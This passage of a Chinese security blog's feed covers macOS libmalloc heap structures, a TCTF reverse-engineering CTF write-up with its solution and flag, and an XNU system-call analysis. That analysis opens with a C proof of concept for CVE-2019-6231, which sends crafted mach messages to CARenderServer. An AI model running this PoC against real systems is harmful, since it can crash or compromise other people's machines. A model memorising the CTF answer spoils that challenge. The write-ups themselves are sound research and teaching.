num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   